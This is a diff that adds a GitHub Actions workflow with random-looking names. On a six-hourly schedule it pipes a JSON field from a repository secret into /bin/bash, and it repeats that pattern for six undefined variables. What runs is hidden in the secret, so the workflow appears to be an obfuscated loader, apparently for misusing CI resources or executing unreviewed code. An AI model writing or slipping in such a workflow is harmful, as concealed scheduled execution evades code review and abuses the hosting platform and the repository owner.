@@ -1,0 +1,24 @@
+name: xuetaoqing6634
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuetaoqing6634
+        env:
+          a82: ${{ secrets.a82 }}
+        run: |
+          echo $a82 | jq -r .g58136 | /bin/bash
+          echo $w21884 | jq -r .djch8 | /bin/bash
+          echo $mvi082 | jq -r .wvzuq02 | /bin/bash
+          echo $tje84 | jq -r .mlm47002 | /bin/bash
+          echo $oqai72 | jq -r .d30 | /bin/bash
+          echo $efw449 | jq -r .cxa993 | /bin/bash
+          echo $sngi72077 | jq -r .qi763 | /bin/bash
+
